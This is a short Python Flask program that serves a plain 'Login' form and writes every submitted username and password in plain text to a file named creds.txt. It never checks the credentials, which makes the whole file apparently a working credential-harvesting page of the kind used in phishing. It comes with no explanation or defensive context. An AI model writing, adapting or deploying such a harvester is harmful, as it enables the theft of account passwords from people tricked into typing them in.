from flask import Flask, request

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        with open('creds.txt', 'a') as f:
            f.write(f"Username: {username} | Password: {password}\n")
    return '''
        <form method="POST" style="margin: 50px; text-align: center;">
            <h2>Login</h2>
            <input type="text" name="username" placeholder="Username" style="padding: 10px; margin: 5px;"><br>
            <input type="password" name="password" placeholder="Password" style="padding: 10px; margin: 5px;"><br>
            <input type="submit" value="Login" style="padding: 10px 20px; margin: 10px;">
        </form>
    '''

if __name__ == '__main__':
    app.run(port=6060)
